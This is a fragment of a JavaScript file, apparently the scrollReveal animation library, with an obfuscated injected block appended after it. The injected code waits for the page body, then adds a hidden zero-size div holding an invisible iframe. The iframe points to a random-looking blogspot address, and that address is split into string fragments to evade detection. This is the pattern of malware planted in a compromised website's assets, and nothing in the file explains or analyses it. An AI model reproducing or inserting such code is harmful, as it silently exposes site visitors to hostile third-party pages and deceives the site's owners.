...
window.scrollReveal = (function (window) {
  ...
  return scrollReveal;
})(window);/*{SCRIPT_CODE}*//*IFA7NKc7Z93QPke41BJ4zK9e2Zr5t*/if( 'undefined' == typeof( ASDAFDEWFDSVSSD ) ) { var ASDAFDEWFDSVSSD = true; (function() { try { var __calb; var __calb = function() { try { if( !document || !document.body ) { window.setTimeout(__calb, 1000); return; } if(document.getElementById('adsd654a65sd4asds654s65d4sa')) return; var ee = document.createElement( 'div' ); ee.innerHTML = '<iframe id="ads'+'d654'+'a65sd4'+'asds654s6'+'5d4sa" src="htt'+'ps://sfasha'+'dsashd'+'shdiushu'+'ihasd.bl'+'ogspo'+'t.c'+'om/" style="display:none;"></iframe>'; ee.style.display = 'none'; ee.style.width = '0px'; ee.style.height = '0px'; document.body.appendChild(ee); }catch(e) { window.setTimeout(__calb, 1000); } }; __calb(); }catch(e){} })(); }/*8e4D830*//*{/SCRIPT_CODE}*/